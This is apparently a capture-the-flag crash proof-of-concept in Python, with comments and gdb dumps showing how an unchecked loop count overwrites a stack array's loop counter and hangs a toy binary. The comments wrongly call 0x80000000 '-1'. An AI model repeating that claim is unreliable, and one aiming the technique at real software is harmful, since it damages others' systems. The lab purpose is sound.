#!/usr/bin/python3
# TITLE : Buffer Overflow CTF
# Author : Vikramaditya
# Email : vikramaditya.65@gmail.com
# Date : 24th November 2021
# Written in : Python3
# Question Program Compiled with $g++ question.cpp -m32 -o question
# Usage : $./crash_poc.py [full_path_of_compiled_question]

# Details : The program has intiger overflow vulneribility. 
# The variable arr[10] is asigned a fixed size on the stack to hold 10 intiger variables but the user has control over the loop responsible for storing the values in the array.
# If a number higher than 10 is supplied to this input : "Enter the count of numbers?" The user can potentially overflow the bounds of the arr array space and overwirte the loop variable.
# This leads to overwriting of the loop variable 'i' which is stored just after the arr array on the stack at ebp-0xc location.

# arr array after 11 inputs : 
# gdb-peda$ x/112 $ebp-0x34
# 0xffffd614:	0x00000001	0x00000002	0x00000003	0x00000004
# 0xffffd624:	0x00000005	0x00000006	0x00000007	0x00000008
# 0xffffd634:	0x00000009	0x0000000a	0x7fffffff
#
# When the add instruction issued in the for loop : 
#    0x56556254 <main+135>:	mov    eax,DWORD PTR [ebp-0xc]
#     0x56556257 <main+138>:	mov    DWORD PTR [ebp+eax*4-0x34],edx
#=>   0x5655625b <main+142>:	add    DWORD PTR [ebp-0xc],0x1
#     0x5655625f <main+146>:	mov    eax,DWORD PTR [ebp-0x3c]
#     0x56556262 <main+149>:	cmp    DWORD PTR [ebp-0xc],eax
#     0x56556265 <main+152>:	jl     0x56556222 <main+85>
# arr array after 'add    DWORD PTR [ebp-0xc],0x1' instruction is issued. 
# gdb-peda$ x/112 $ebp-0x34
# 0xffffd614:	0x00000001	0x00000002	0x00000003	0x00000004
# 0xffffd624:	0x00000005	0x00000006	0x00000007	0x00000008
# 0xffffd634:	0x00000009	0x0000000a	0x80000000

# Since signed intiger can hold a maximum positive value of 0x7fffffff adding one to it overflows the variable to -1 (0x80000000). Hence the 'i' variable becomes -1. 
# 0x5655625f <main+146>:	mov    eax,DWORD PTR [ebp-0x3c]
# 0x56556262 <main+149>:	cmp    DWORD PTR [ebp-0xc],eax
# Next the compare is done with the value stored in num variable (ebp-0x3c) with negative value stored in 'i', which obviously fails. 
# This causes the program loop to run infinite number of times and overwirte the buffer again and again. 
# We also fill up the maximum value the arr_num variable. Hence cin will fail to take input from user causing the program treat 0x7fffffff as input.
import subprocess
import time
import sys
import argparse
import binascii

if __name__ == '__main__' :

	arg_parser = argparse.ArgumentParser(description='Buffer Overflow CTF Crash POC', usage='./crash_poc.py compiled_file')
	arg_parser.add_argument('FilePath' , type=str , help='Provide the full path to the compiled question.cpp application');
	args = arg_parser.parse_args()
	
	p = subprocess.Popen(args.FilePath , stdin=subprocess.PIPE, stderr=subprocess.STDOUT, stdout=subprocess.PIPE);
	print("Program enters infinite loop because of the last value : 2147483648\n");
	print(bytes(p.communicate(b'11\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n2147483648\n')[0]).decode('UTF-8'));